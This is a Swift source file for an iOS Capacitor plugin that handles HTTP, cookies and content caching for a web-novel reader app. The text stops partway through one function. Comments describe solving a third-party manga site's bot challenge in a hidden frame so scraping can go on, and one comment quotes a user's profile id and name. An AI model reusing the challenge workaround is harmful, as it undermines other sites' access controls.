import Foundation
import Capacitor
import WebKit

/**
 SangTacHttpPlugin — iOS stand-in for the Android build's
 `com.getcapacitor.plugin.http.Http` (which the APK patched to add X-STV-Sign).

 The site's frontend (app.v2.js / app.v2.read.js / app.v2.bookdisplay.js) calls
 `Capacitor.Plugins.Http.get({url, headers, ...})` whenever `window.Capacitor`
 exists, with headers:
   x-stv-transport: app
   x-requested-with: com.sangtacviet.mobilereader
   Cookie: document.cookie        <- incomplete: httpOnly cookies are missing

 Three things this plugin must get right on iOS:

 1. Cookies. httpOnly cookies (access / useri2 / readcontextid ...) never appear
    in `document.cookie`, so the JS-supplied Cookie header is incomplete. We
    rebuild it from WKWebsiteDataStore (which does hold httpOnly cookies).
    WKWebView and URLSession do not share cookie storage, so Set-Cookie
    responses are written back into the web view's cookie store afterwards.

 2. Response `data` typing. The Android reference implementation
    (HttpRequestHandler.readData) parses JSON *only* when the Content-Type
    contains "application/json"; every other content type yields a STRING
    (or base64 for responseType blob/arraybuffer). The site depends on that:
    app.reader.getContent2 does `r.data.replace(...)` on a response whose
    Content-Type is text/html, so an eagerly-parsed object makes the reader
    throw and never render the chapter.

 3. Referer. The site's read endpoints require a same-site Referer but the
    Capacitor call sites do not send one; we fall back to the web view's
    current URL (a browser would do the same) instead of a bare origin.

 Response shape matches @capacitor-community/http: {status, data, headers, url}.
 */
@objc(SangTacHttpPlugin)
public class SangTacHttpPlugin: CAPPlugin, CAPBridgedPlugin, WKHTTPCookieStoreObserver {

    public let identifier = "SangTacHttpPlugin"
    public let jsName = "Http"
    public let pluginMethods: [CAPPluginMethod] = [
        CAPPluginMethod(name: "get", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "post", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "put", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "patch", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "delete", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "request", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "syncCookies", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "setDiagnostics", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "startForeground", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "stopForeground", returnType: CAPPluginReturnPromise),
        // The content cache's own surface: what it holds, its budget, and how to
        // empty it. Called by the settings rows the `contentCache` block adds
        // (docs/capacitor-port.md §6.45.3 (7)).
        CAPPluginMethod(name: "cacheStats", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "cacheConfig", returnType: CAPPluginReturnPromise),
        CAPPluginMethod(name: "clearCache", returnType: CAPPluginReturnPromise)
    ]

    /// Mirror of the Android plugin's default; only used when the site sends no
    /// User-Agent of its own.
    private static let defaultUserAgent =
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"

    /// Fallback when the caller passes no timeout. The site passes `timeout`
    /// (ms) on its domain-health probes; honouring it keeps a dead domain from
    /// blocking the reader for minutes.
    private static let defaultTimeout: TimeInterval = 60

    private let session: URLSession = {
        // Respect the server's own caching headers. The previous
        // .reloadIgnoringLocalCacheData forced every launch to refetch through
        // the native bridge whatever the site's PHP endpoints were willing to
        // let the webview reuse -- lang/zh.json, cover images, page-flip.mp3,
        // qtOnline.js -- which is a large part of "the home page still takes
        // ages after a cold start". Requests whose answer must never be stale
        // (chapter text, mutations) opt out per-request in `perform`.
        //
        // The budget is deliberately large: the site ships ~520KB of wire
        // critical-path JS/CSS plus covers, and a cache that evicts between
        // launches buys nothing. Disk is cheap here, refetching over a
        // 300-900ms-TTFB link is not.
        URLCache.shared = URLCache(memoryCapacity: 64 * 1024 * 1024,
                                   diskCapacity: 512 * 1024 * 1024,
                                   diskPath: nil)
        let config = URLSessionConfiguration.default
        config.requestCachePolicy = .useProtocolCachePolicy
        config.urlCache = URLCache.shared
        config.timeoutIntervalForRequest = 60
        config.timeoutIntervalForResource = 120
        config.httpCookieAcceptPolicy = .always
        config.httpShouldSetCookies = true
        return URLSession(configuration: config)
    }()

    /// Endpoints whose response must be fetched fresh every time: chapter bodies
    /// (the site already keeps its own offline copy) and anything that mutates
    /// server state.
    private static func mustRevalidate(_ url: URL) -> Bool {
        let text = url.absoluteString
        return text.contains("sajax=readchapter")
            || text.contains("jsonify.php")
            || text.contains("bookmanage.php")
    }

    /**
     Which class of answer this request is asking for, or nil for everything that
     must never be answered from a stored copy.

     This is the whole admission policy of the content cache: a class named here
     is one `ContentPolicies` has a rule for, and everything else -- every write,
     every probe, every endpoint nobody has measured -- falls through to "always
     the network".

     Two paths are shared between reads and writes and are told apart by their
     query: `booklist.php` only caches the `method=` list tabs and only as a POST
     (the POST body is the reader's own history list, which is why the body is
     part of the key), and `comment.php` only caches its first page.
     */
    static func contentClass(method: String, url: URL, responseType: String?) -> ContentClass? {
        let text = url.absoluteString
        // The reader asks for these two through the plugin directly
        // (app.v2.read.js:552-576 / app.v2.js:263).
        if text.contains("sajax=readchapter") { return .chapter }
        if text.contains("sajax=getchapterlist") { return .chapterList }
        if text.contains("/mobile/bookinfo.php") { return .bookInfo }
        if text.contains("/mobile/booklist.php") {
            guard method.caseInsensitiveCompare("POST") == .orderedSame else { return nil }
            guard let range = text.range(of: "method=") else { return nil }
            let name = String(text[range.upperBound...].prefix { $0.isLetter || $0.isNumber })
            let tabs = ["history", "following", "bookmarked", "mybook", "bookpush", "nhunger"]
            return tabs.contains(name) ? .homeList : nil
        }
        if text.contains("/mobile/userinfo.php") { return .userInfo }
        if text.contains("act=readcomment") {
            // Later pages are what "load more" asks for, and a stale one there is
            // a visible duplicate or a skip rather than a saved round trip.
            return text.contains("start=0") ? .comment : nil
        }
        if text.contains("/mobile/lang/") {
            // `zh.json`, `vi.json`: the site's own UI strings, 5321 bytes, and
            // the one URL this plugin sees on every single launch (round-48 log,
            // 681-1716ms). GET only, and only the `.json` tables -- nothing else
            // lives in that directory today, but a path test is cheaper than
            // trusting that.
            guard method.caseInsensitiveCompare("GET") == .orderedSame else { return nil }
            guard url.pathExtension.lowercased() == "json" else { return nil }
            return .siteAsset
        }
        if text.contains("/io/grantcontext/context") { return .grant }
        // Covers and page images: the site fetches every one of them through
        // `Http.get({responseType: 'blob'})` (app.v2.js:7328-7337). Whether the
        // bytes really are an image is decided by `isImageBody` before storing,
        // so a non-image that happens to be asked for as a blob is simply not
        // kept -- which is why this branch needs no host or path test.
        let requested = (responseType ?? "").lowercased()
        if requested == "blob" || requested == "arraybuffer" { return .image }
        return nil
    }

    /// Whether the serving host belongs in the key. It does not for the two read
    /// endpoints: `bestDomain()` moves between launches and mirrors not only
    /// change, they are chosen by a race the reader cannot see (§6.25), while
    /// `h=` already names the content server that hosts the book. Getting this
    /// wrong costs one wasted round trip; including the host would make every
    /// chapter miss whenever the reader's mirror changed, which is the exact
    /// failure this cache exists to remove.
    static func includesHost(_ cls: ContentClass) -> Bool {
        switch cls {
        // `siteAsset` joins the two read endpoints: the same table is served
        // byte-identically from every mirror (the round-48 log has
        // `sangtacviet.app/mobile/lang/zh.json` and `sangtacviet.com/…` at the
        // same 5321 bytes), so keying on the host would throw the entry away on
        // every mirror change -- the failure this cache exists to remove.
        //
        // `userInfo` joins them for the same reason, and the 2026-10-13 21:46
        // device log is why it had to. The signed-in profile is served
        // byte-identically from every mirror (454 bytes, the same
        // `{"id":"306185","name":"mingzihaojiandan",…}` head on
        // `sangtacviet.app` and on `dns1.stv-appdomain-00000001.org`), while the
        // host a request *will* use is not knowable in advance: the page's
        // `fullUrl()` (app.v2.js:110-129) prefers `window.location.origin` only
        // while that origin is alive, and the log says it is not --
        // `route: page=https://sangtacviet.com alive=no` -- so the site's own
        // requests land on `bestDomain()` (`sangtacviet.app`) and never on the
        // page's host. Keying on the host therefore made the prewarm below write
        // under a name no reader request could ever look up.
        case .chapter, .chapterList, .siteAsset, .userInfo: return false
        default: return true
        }
    }

    /**
     The persistent answer store (docs/capacitor-port.md §6.45). One owner for
     "may this be reused", "what is its key", "is it still current" and "evict
     what" -- the old code spread the first two between `cachePolicy` and an
     ad-hoc key built at the call site, which is exactly how a policy and its key
     drift apart.

     In memory this is only an index of small sidecars; the bytes live on disk,
     so a chapter read yesterday is still here today, which is the whole point of
     the change.
     */
    let contentCache = ContentCache()

    /// One answer, handed to every caller waiting on the same request.
    struct SharedAnswer {
        let status: Int
        let contentType: String
        let headers: [String: String]
        let body: Data
        let failure: String?
    }

    private final class InFlightRequest {
        var waiters: [(SharedAnswer) -> Void] = []
    }

    private let inFlightLock = NSLock()
    private var inFlight: [String: InFlightRequest] = [:]

    /// `true` when this caller has to perform the request; `false` when an
    /// identical one is already on the wire and this call was attached to it.
    ///
    /// The 2026-09-23 device log is the reason: the same 115KB chapter list
    /// fetched three times in one launch (1484 + 1162 + 828 ms) and
    /// `userinfo.php` twice back to back. Nothing in the site's own `app.net`
    /// de-duplicates a request, and both of those answers are identical inside
    /// one launch.
    func registerInFlight(_ key: String, waiter: @escaping (SharedAnswer) -> Void) -> Bool {
        inFlightLock.lock()
        if let existing = inFlight[key] {
            existing.waiters.append(waiter)
            inFlightLock.unlock()
            return false
        }
        let entry = InFlightRequest()
        inFlight[key] = entry
        inFlightLock.unlock()
        return true
    }

    func finishInFlight(_ key: String, answer: SharedAnswer) {
        inFlightLock.lock()
        let entry = inFlight.removeValue(forKey: key)
        inFlightLock.unlock()
        guard let entry = entry else { return }
        for waiter in entry.waiters { waiter(answer) }
    }

    // MARK: - Refusals (in memory for a minute, on disk for half an hour)

    /// How long a server-side refusal is remembered **in this process**. Long
    /// enough to cover one screen drawing the same broken cover three times
    /// (round-48 log: 09:01:00, 09:01:19, 09:01:22 -- 852ms each), short enough
    /// that a block which lifts mid-session is not remembered for the rest of it.
    ///
    /// The disk layer behind it is `ContentCache.refusalRetention` (30 minutes)
    /// and only exists for images; see `persistedRefusalClasses`.
    private static let refusalWindow: TimeInterval = 60

    /// The largest refusal body worth keeping -- a 4xx answer is a sentence or,
    /// as here, a single byte; a 5xx answer can be a whole HTML document, and
    /// the point of this memory is to save a round trip, not to become a second
    /// cache.
    private static let refusalBodyCap = 64 * 1024

    /// The most refusals held at once, oldest dropped first. A screenful of
    /// broken covers is a handful; a bound keeps a pathological list from
    /// growing for the life of the process.
    private static let refusalLimit = 128

    private struct Refusal {
        let status: Int
        let contentType: String
        let headers: [String: String]
        let body: Data
        let at: Date
        /// Whether this came off disk rather than out of this process's memory.
        /// The log line says which, because "it is remembered" and "it is
        /// remembered across launches" are two different claims and only the
        /// first one was true before this round -- the round-49 device log shows
        /// a 403 at 09:53:04 failing to stop the identical request at 09:53:46,
        /// 42 seconds later, because 09:53:42 was a new process.
        let persisted: Bool
    }

    /// Which classes' refusals are worth writing down. **Images only.**
    ///
    /// A written-down refusal cannot be cleared by a success, because it is the
    /// refusal itself that stops the request which would find that success: its
    /// fixed window is the only thing that ends it. For a cover whose host
    /// hotlink-blocks the link that is a thumbnail missing for half an hour; for
    /// a chapter, a list or the profile row it would be "cannot read" or "cannot
    /// see my own books" for half an hour after the server came back. Those three
    /// keep the in-process memory only.
    private static let persistedRefusalClasses: Set<ContentClass> = [.image]

    private let refusalLock = NSLock()
    private var refusals: [String: Refusal] = [:]

    /**
     Remember a refusal for `refusalWindow` so the next identical request is
     answered without touching the network.

     Only a status the server itself used to say no (>= 400) goes in here. A 2xx
     answer is the content cache's business, and the two must not be confused:
     `grantcontext` answers 200 with 700-900KB and is deliberately not stored,
     so it must never be picked up by this path either.

     The case this exists for is in the round-48 log:

         GET https://www.trxs.cc/d/file/tongren/20260810/08e0d41f…jpeg
             -> 403 text/html base64 1b in 852ms

     three times in one launch, because the detail page and the list each draw
     that cover. Its host hotlink-blocks this link, so 60 seconds of "do not ask
     again" costs at most a broken cover that would have stayed broken anyway.

     What that version missed (round-49 log): 60 seconds only helps *within* one
     process. A cold launch in between starts with an empty memory and pays the
     853ms again, so `notePersistedRefusal` writes the image case down and
     `ContentCache.refusalRetention` is what ends it.
     */
    private func noteRefusal(key: String, status: Int, contentType: String,
                             headers: [String: String], body: Data) {
        guard body.count <= SangTacHttpPlugin.refusalBodyCap else { return }
        let now = Date()
        refusalLock.lock()
        refusals = refusals.filter {
            now.timeIntervalSince($0.value.at) < SangTacHttpPlugin.refusalWindow
        }
        if refusals.count >= SangTacHttpPlugin.refusalLimit,
           let oldest = refusals.min(by: { $0.value.at < $1.value.at })?.key {
            refusals.removeValue(forKey: oldest)
        }
        refusals[key] = Refusal(status: status, contentType: contentType,
                                headers: headers, body: body, at: now, persisted: false)
        refusalLock.unlock()
    }

    /// Write a refusal down as well, so the *next launch* does not pay for it
    /// again. `persistedRefusalClasses` is what decides whether it is allowed to
    /// outlive this process at all; the disk mechanics belong to the cache.
    /// Returns whether it was actually written, so the log line can say so.
    @discardableResult
    private func notePersistedRefusal(key: String, cls: ContentClass, status: Int,
                                      contentType: String, headers: [String: String],
                                      body: Data) -> Bool {
        guard SangTacHttpPlugin.persistedRefusalClasses.contains(cls) else { return false }
        return contentCache.storeRefusal(key: key, status: status, contentType: contentType,
                                         headers: headers, body: body, at: Date())
    }

    /// The remembered refusal for `key`, from this process first and from disk
    /// second, or nil when there is none or it has aged out. An aged-out memory
    /// entry is dropped as it is noticed, so neither layer can outlive its own
    /// window.
    private func refusal(for key: String, cls: ContentClass) -> Refusal? {
        if let hit = memoryRefusal(for: key) { return hit }
        guard SangTacHttpPlugin.persistedRefusalClasses.contains(cls),
              let record = contentCache.storedRefusal(key) else { return nil }
        return Refusal(status: record.status, contentType: record.contentType,
                       headers: record.headers, body: record.body, at: record.at,
                       persisted: true)
    }

    private func memoryRefusal(for key: String) -> Refusal? {
        let now = Date()
        refusalLock.lock()
        defer { refusalLock.unlock() }
        guard let hit = refusals[key] else { return nil }
        if now.timeIntervalSince(hit.at) >= SangTacHttpPlugin.refusalWindow {
            refusals.removeValue(forKey: key)
            return nil
        }
        return hit
    }

    // MARK: - Grant answers (evidence, not a cache)

    /// How many distinct grant URLs are compared against each other.
    private static let grantDigestLimit = 16

    private struct GrantDigest {
        let digest: String
        let at: Date
    }

    private let grantLock = NSLock()
    private var grantDigests: [String: GrantDigest] = [:]

    /**
     Says whether this `grantcontext` answer is byte-identical to the previous one
     for the same URL, and returns the sentence for the log line. Records nothing
     else and changes no behaviour: the answer is still handed to the page exactly
     as it arrived.

     Why this is instrumentation and not a cache. `grantcontext` is the largest
     remaining wait in the round-49 device log -- 674-813KB of obfuscated
     JavaScript, re-downloaded every time the reader opens a book (09:53:07:
     674609b in 1146ms; 09:53:54: 813138b in 1240ms; 09:54:09 for the other
     mirror host: 813138b in 767ms), and it is served even when every chapter and
     the book detail came from cache. It is deliberately never stored: it is the
     source of the short-lived `key=` a chapter URL carries, so a stale copy is a
     chapter that will not decrypt.

     The log already says enough to guess and not enough to know. Two answers for
     the *same* book and host differ in size and in obfuscated prefix (674609
     then 813138), yet `hostid=trxs` and `hostid=trxs2` answered with the same
     813138 bytes and the same prefix -- so the payload is neither request-unique
     nor constant, and the truncated `head=` cannot settle which. A digest of the
     whole body can, on the next launch, without risking a single read.
     */
    private func noteGrantDigest(key: String, body: Data) -> String {
        let digest = String(ContentCache.bodyHash(body).prefix(8))
        let now = Date()
        grantLock.lock()
        let previous = grantDigests[key]
        if grantDigests.count >= SangTacHttpPlugin.grantDigestLimit,
           let oldest = grantDigests.min(by: { $0.value.at < $1.value.at })?.key {
            grantDigests.removeValue(forKey: oldest)
        }
        grantDigests[key] = GrantDigest(digest: digest, at: now)
        grantLock.unlock()

        guard let previous = previous else { return " sha=\(digest) first" }
        let age = Int(now.timeIntervalSince(previous.at))
        if previous.digest == digest {
            return " sha=\(digest) same as the answer \(age)s ago"
        }
        return " sha=\(digest) differs from \(previous.digest) seen \(age)s ago"
    }

    // MARK: - Request policy

    /**
     Hosts whose requests are allowed to carry the web view's cookies.

     The page can call this plugin with any URL, and the plugin answers with the
     session cookies attached. That is the whole point (the site's session is
     httpOnly, so the page cannot build that header itself), but it also means a
     single line of injected script could ask us to deliver the session to a
     host of its choosing. Cookies are therefore attached only when the target
     is one of these; everything else still works, it just travels anonymous --
     which keeps the user-configurable translation endpoint (设置 -> 自定义接口
     地址) usable without opening the cookie surface to the whole internet.
     */
    private static let cookieHosts = [
        "sangtacviet.com",
        "sangtacviet.vip",
        "sangtacviet.app",
        "stv-appdomain-00000001.org",
        // The comic browser is a site feature that scrapes third-party manga
        // sites, and BaoziManhua now answers its list API with a bot challenge
        // (`challenge_required`) whose pass token IS a cookie. The `comicGate`
        // block solves that challenge in a hidden frame of this web view, so the
        // token lands in WKWebsiteDataStore -- and without this host on the list
        // the retry would travel anonymous and be challenged again.
        //
        // It cannot leak the site's session: `matching(_:host:)` keeps only the
        // cookies whose domain is the request's host, so a request to baozimh
        // carries baozimh's cookies and nothing else.
        "baozimh.com"
    ]

    /// Hosts the app itself talks to for translation. Listed so the diagnostic
    /// panel can name them; they are not trusted with cookies (they have none).
    private static let knownApiHosts = [
        "translation.googleapis.com",
        // The keyless Google channel (`client=gtx`) lives on a different host from
        // the official API, so the panel would otherwise call it a foreign host on
        // every request.
        "translate.googleapis.com",
        "api.cognitive.microsofttranslator.com",
        "api-free.deepl.com",
        "api.deepl.com",
        "api.openai.com",
        "edge.microsoft.com"
    ]

    private static func hostMatches(_ host: String, _ suffix: String) -> Bool {
        return host == suffix || host.hasSuffix("." + suffix)
    }

    private static func allowsCookies(_ url: URL) -> Bool {
        guard let host = url.host?.lowercased(), !host.isEmpty else { return false }
        return cookieHosts.contains { hostMatches(host, $0) }
    }

    private static func isKnownHost(_ url: URL) -> Bool {
        guard let host = url.host?.lowercased() else { return false }
        return cookieHosts.contains { hostMatches(host, $0) }
            || knownApiHosts.contains { hostMatches(host, $0) }
    }

    /// Hosts already reported, so a request to a user-configured endpoint does
    /// not repeat the line on every call.
    private let foreignHostLock = NSLock()
    private var warnedForeignHosts: Set<String> = []

    /// One line per host the first time a request goes out without cookies.
    ///
    /// The cookie host list is hard-coded, and the site's mirrors are hard-coded
    /// in its own JS too (`defaultDomains`, app.v2.js:932 / :1035) with a
    /// rotatable-looking `stv-appdomain-00000001.org` suffix. If the site ever
    /// adds a second mirror, requests to it would succeed but arrive anonymous,
    /// which on device looks like "randomly logged out" or "code 7" rather than
    /// like a policy decision. This makes that visible.
    private func warnForeignHost(_ url: URL) {
        guard !SangTacHttpPlugin.isKnownHost(url) else { return }
        let host = url.host?.lowercased() ?? ""
        foreignHostLock.lock()
        let isNew = warnedForeignHosts.insert(host).inserted
        foreignHostLock.unlock()
        guard isNew else { return }
        callLog("policy", "no cookies sent to \(host): not a site host")
    }

    // MARK: - Log redaction

    /**
     Everything this plugin logs is reachable by the user: the in-page panel has
     a COPY button and CAPLog lines are readable from Console.app. The Google
     engine used to put the user's API key in the query string, so a `key=`
     parameter would land in that panel verbatim. Redact before logging, never
     after.

     Three shapes, and they must not overlap: a query parameter, a JSON field
     (the quoted form, which is how a body echoes a header), and a raw header
     line (the unquoted form). The quoted names are listed in the JSON pattern
     rather than left to the header pattern, so `"Authorization": "Bearer x"`
     becomes `"Authorization": "***"` instead of a half-rewritten line.
     */
    private static let redactionPatterns: [NSRegularExpression] = {
        let query = "([?&](?:key|api[-_]?key|access_?token|subscription[-_]?key|token|password|secret|signature|sig)=)[^&#\\s]*"
        let json = "(\"(?:key|api[-_]?key|access_?token|subscription[-_]?key|token|password|secret|signature|authorization|ocp-apim-subscription-key|x-goog-api-key)\"\\s*:\\s*)(\"[^\"]*\"|[^,}\\s]+)"
        let header = "((?:ocp-apim-subscription-key|authorization|x-goog-api-key)\\s*:\\s*)[^\\r\\n]*"
        return [query, json, header].compactMap {
            try? NSRegularExpression(pattern: $0, options: [.caseInsensitive])
        }
    }()

    static func redact(_ text: String) -> String {
        var out = text
        for regex in redactionPatterns {
            let range = NSRange(out.startIndex..<out.endIndex, in: out)
            out = regex.stringByReplacingMatches(in: out, options: [], range: range,
                                                 withTemplate: "$1***")
        }
        return out
    }

    // MARK: - Cookie snapshot

    /**
     `getAllCookies` is an asynchronous hop to the main thread plus a walk of
     every cookie on the device, and the book list fires dozens of requests at
     once -- so the old code paid that per request, on the critical path.

     Instead we keep a snapshot, refreshed by `WKHTTPCookieStoreObserver`
     (which fires for server Set-Cookie, page `document.cookie` writes and our
     own writes alike) and updated synchronously whenever *we* store a
     response's cookies, so a login round trip is never one request behind.

     The fallback matters: until the first snapshot lands, a request goes
     through the old asynchronous read rather than being served an empty
     cookie jar.
     */
    private let cookieLock = NSLock()
    private var cookieSnapshot: [HTTPCookie] = []
    private var cookieSnapshotReady = false
    private var snapshotRefreshScheduled = false
    /// Bumped by every `mergeSnapshot`. A full store read captures this before it
    /// is issued and drops its answer if a merge landed meanwhile: otherwise a
    /// read that started before a Set-Cookie could finish after it and replace
    /// the snapshot with one that predates that cookie -- and since the request
    /// path prefers the snapshot once it is warm, that would send the next few
    /// requests out without the session cookie they just received.
    private var snapshotGeneration = 0

    private func currentGeneration() -> Int {
        cookieLock.lock()
        defer { cookieLock.unlock() }
        return snapshotGeneration
    }

    private func setSnapshot(_ cookies: [HTTPCookie], issuedAt generation: Int) {
        cookieLock.lock()
        let stale = generation != snapshotGeneration
        if !stale {
            cookieSnapshot = cookies
            cookieSnapshotReady = true
        }
        cookieLock.unlock()
        // A read that lost its race is retried rather than simply dropped. It has
        // to be dropped -- applying it could erase a cookie merged while it was in
        // flight -- but leaving it at that keeps the snapshot cold, which sends
        // every later request back through the full store walk this snapshot
        // exists to remove. In a quiet window the retry lands and the snapshot
        // goes warm.
        if stale { scheduleSnapshotRefresh() }
    }

    /// Merges cookies we just received into the snapshot so the next request
    /// sees them immediately, without waiting for the observer to fire.
    private func mergeSnapshot(_ incoming: [HTTPCookie]) {
        cookieLock.lock()
        var merged = cookieSnapshot
        for cookie in incoming {
            merged.removeAll { existing in
                existing.name == cookie.name
                    && existing.domain == cookie.domain
                    && existing.path == cookie.path
            }
            merged.append(cookie)
        }
        cookieSnapshot = merged
        // Deliberately does NOT mark the snapshot warm. From a cold start this
        // holds only the cookies of one response, and promoting that to
        // "authoritative" would send the next few requests out without the
        // httpOnly session cookies until the observer's full read lands. Only
        // `setSnapshot` -- which comes from a complete `getAllCookies` -- marks it
        // ready; until then the async fallback runs.
        snapshotGeneration += 1
        cookieLock.unlock()
    }

    /// `nil` means "no snapshot yet -- use the asynchronous store read".
    private func snapshotCookies(for url: URL?) -> [HTTPCookie]? {
        cookieLock.lock()
        defer { cookieLock.unlock() }
        guard cookieSnapshotReady else { return nil }
        guard let url = url else { return cookieSnapshot }
        return SangTacHttpPlugin.matching(cookieSnapshot, host: url.host ?? "")
    }

    /// Coalesced: the site writes `transmode` / `foreignlang` immediately before
    /// every chapter read, and a full cookie-store walk per write would hand back
    /// much of the cost the snapshot exists to remove. At most one refresh per
    /// runloop turn, and a change that lands while a refresh is in flight
    /// schedules the next one.
    /// One coalesced full read of the cookie store: at most one per runloop turn,
    /// and a change that lands while a refresh is in flight schedules the next
    /// one. Coalescing matters because the site writes `transmode` /
    /// `foreignlang` immediately before every chapter read, and a full store walk
    /// per write would hand back much of the cost the snapshot exists to remove.
    ///
    /// Also the retry path for a read that lost its race (see `setSnapshot`).
    private func scheduleSnapshotRefresh() {
        cookieLock.lock()
        let alreadyScheduled = snapshotRefreshScheduled
        snapshotRefreshScheduled = true
        cookieLock.unlock()
        guard !alreadyScheduled else { return }
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            self.cookieLock.lock()
            self.snapshotRefreshScheduled = false
            self.cookieLock.unlock()
            let generation = self.currentGeneration()
            WKWebsiteDataStore.default().httpCookieStore.getAllCookies { [weak self] cookies in
                self?.setSnapshot(cookies, issuedAt: generation)
            }
        }
    }

    public func cookiesDidChange(in cookieStore: WKHTTPCookieStore) {
        scheduleSnapshotRefresh()
    }

    // MARK: - Diagnostics switch

    /// Off unless the in-page panel asks for it. Every diagnostic line used to
    /// be built and shipped across the bridge on every request even with the
    /// panel closed: `preview()` decoded the whole response body and
    /// `evaluateJavaScript` is a cross-process call. Round 14 turned the JS side
    /// off; this turns the native side off too.
    private let diagLock = NSLock()
    private var diagnosticsEnabled = false

    private var diagnosticsOn: Bool {
        diagLock.lock()
        defer { diagLock.unlock() }
        return diagnosticsEnabled
    }

    private func setDiagnosticsEnabled(_ on: Bool) {
        diagLock.lock()
        diagnosticsEnabled = on
        diagLock.unlock()
    }

    // MARK: - Bridged methods

    override public func load() {
        DispatchQueue.main.async { [weak self] in
            guard let self = self else { return }
            // Both the store and this plugin live for the process lifetime, so
            // the observer is never removed. (Capacitor's own cookie manager
            // registers a temporary observer and relies on it surviving, which
            // only makes sense if the store retains observers.)
            let store = WKWebsiteDataStore.default().httpCookieStore
            store.add(self)
            let generation = self.currentGeneration()
            store.getAllCookies { [weak self] cookies in
                self?.setSnapshot(cookies, issuedAt: generation)
            }
            // The first-request prewarm (see `prewarmUserInfo`). Late on purpose:
            // the shell's own boot window belongs to the site's bundles.
            DispatchQueue.main.asyncAfter(deadline: .now() + 2.0) { [weak self] in
                self?.prewarmUserInfo()
            }
        }
    }

    /// Called by the `diag` site patch whenever the logging switch changes, so
    /// the native hot path stops paying for lines nobody will read.
    @objc func setDiagnostics(_ call: CAPPluginCall) {
        var on = false
        if let raw = call.options["enabled"], !(raw is NSNull) {
            if let number = raw as? NSNumber { on = number.boolValue }
            else if let text = raw as? String { on = (text == "true" || text == "1") }
        }
        setDiagnosticsEnabled(on)
        call.resolve(["enabled": on])
    }

    // MARK: - Content cache methods

    /**
     The three calls the injected `contentCache` block makes: what the cache is
     holding, how to change its budget, and how to empty it.

     The settings live in this plugin's own UserDefaults key rather than in the
     site's Preferences store -- §6.45.3 (8) moves the site's own blobs *out* of
     UserDefaults for size reasons, and the cache config must not ride along with
     the store that change is trying to keep small.
     */
    @objc func cacheStats(_ call: CAPPluginCall) {
        call.resolve(contentCache.stats())
    }

    @objc func cacheConfig(_ call: CAPPluginCall) {
        var config = contentCache.config
        var changed = false
        if let raw = call.options["retentionDays"] as? NSNumber, raw.intValue > 0 {
            config.retentionDays = raw.intValue
            changed = true
        }
        if let raw = call.options["maxBytes"] as? NSNumber, raw.intValue > 0 {
            config.maxBytes = raw.intValue
            changed = true
        }
        if let raw = call.options["maxEntries"] as? NSNumber, raw.intValue > 0 {
            config.maxEntries = raw.intValue
            changed = true
        }
        if let raw = call.options["enabled"], !(raw is NSNull) {
            if let number = raw as? NSNumber {
                config.enabled = number.boolValue
                changed = true
            } else if let text = raw as? String {
                config.enabled = (text == "true" || text == "1")
                changed = true
            }
        }
        if changed {
            contentCache.apply(config: config)
            cacheLog("config retention=\(config.retentionDays)d bytes=\(config.maxBytes)"
                + " entries=\(config.maxEntries) enabled=\(config.enabled)")
        }
        call.resolve(contentCache.stats())
    }

    @objc func clearCache(_ call: CAPPluginCall) {
        let result = contentCache.clear()
        let cleared = result["entries"] ?? 0
        cacheLog("cleared \(cleared) content entr(ies)")
        call.resolve(["cleared": cleared])
    }

    // MARK: - First-request prewarm

    /**
     `userinfo.php` is the first data request of a cold start and the device log
     shows it asked for twice, back to back (484 + 711ms in the 2026-09-23 log).
     Asking for it from here, a moment after the web view is up, means the
     reader's own request finds an answer on disk instead of spending a round trip
     on it.

     **The request has to be the one the reader will actually issue, or this is a
     wasted round trip rather than a warm cache** -- and until the 2026-10-13
     21:46 device log it was exactly that. The reader asks with
     `app.net.post("/mobile/userinfo.php", "")` (`app.v2.js:3998`), while this
     prewarm asked with `GET`: `method` is part of the cache key
     (`ContentCache.key`), so a GET can only ever write a name no POST will look
     up. Ten device logs agree -- **14 `prewarmed` stores, 0 reads** of that
     class, i.e. one wasted 454-byte request every launch since the prewarm
     landed. Same story for the host, which is why `includesHost` now drops it for
     this class too: the prewarm can only know the *page's* host
     (`sangtacviet.com`, which the page itself reports `alive=no`), while the
     reader's request goes to whatever `bestDomain()` picked
     (`sangtacviet.app`), so the two keys named different entries.
     */
    private let userInfoLock = NSLock()
    private var sawUserInfoRequest = false
    private var prewarmed = false

    private func noteUserInfoRequest() {
        userInfoLock.lock()
        sawUserInfoRequest = true
        userInfoLock.unlock()
    }

    /**
     Deliberately late: the site's own shell and its boot bundles own the first
     seconds, and adding a request inside that window costs the reader more than it
     saves. Two seconds in the shell has already painted (§6.23: `shell released`
     at +1225ms) and one extra connection changes nothing.

     Skipped when the site has already asked for the same thing: a prewarm that
     races the reader's own request is a duplicated request, not a warm cache.

     The window matters as much as the request: this runs at +2s and the reader's
     own POST lands at about +6s (both in the 2026-10-13 21:46 log), which is
     inside the class's 60-second TTL -- so once the key matches, the reader's
     request is answered from disk rather than from the network.
     */
    private func prewarmUserInfo() {
        userInfoLock.lock()
        let already = sawUserInfoRequest || prewarmed
        prewarmed = true
        userInfoLock.unlock()
        guard !already, contentCache.isEnabled else { return }
        guard let page = self.bridge?.webView?.url,
              let host = page.host, !host.isEmpty,
              let url = URL(string: "https://" + host + "/mobile/userinfo.php") else { return }
        nativeCookies(for: url) { [weak self] cookies in
            guard let self = self else { return }
            var headers: [String: String] = [
                "x-stv-transport": "app",
                "x-requested-with": "com.sangtacviet.mobilereader",
                "User-Agent": SangTacHttpPlugin.defaultUserAgent,
                // What `bodyData(for:)` sets for the reader's own empty-string
                // POST body, so the two requests are the same request.
                "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
                "Referer": page.absoluteString,
                "Origin": page.scheme.map { $0 + "://" + host } ?? ("https://" + host)
            ]
